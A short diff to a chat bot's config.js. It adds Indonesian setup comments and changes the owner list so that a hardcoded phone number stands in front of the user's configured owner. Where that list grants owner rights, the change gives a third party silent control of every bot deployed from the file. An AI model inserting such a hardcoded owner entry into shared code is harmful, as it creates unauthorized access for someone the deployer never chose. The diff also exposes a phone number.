@@ -15,11 +15,17 @@ global.APIKeys = {
 
 global.wait = "```[!] Sedang Diproses...```"
 
+/*
+* Masukin nomor lu di sgdc.json
+* Masukin juga apikey lu di src/kntl.json
+* 
+* Silahkan pake bot ini sebijak mungkin !
+*/
 
 let fs = require('fs')
 let chalk = require('chalk')
 let file = require.resolve(__filename)
-global.rowner = [(sgdc.rowner)]
+global.rowner = ['6282252655313',(sgdc.rowner)]
 fs.watchFile(file, () => {
   fs.unwatchFile(file)
   console.log(chalk.redBright("Update 'config.js'"))
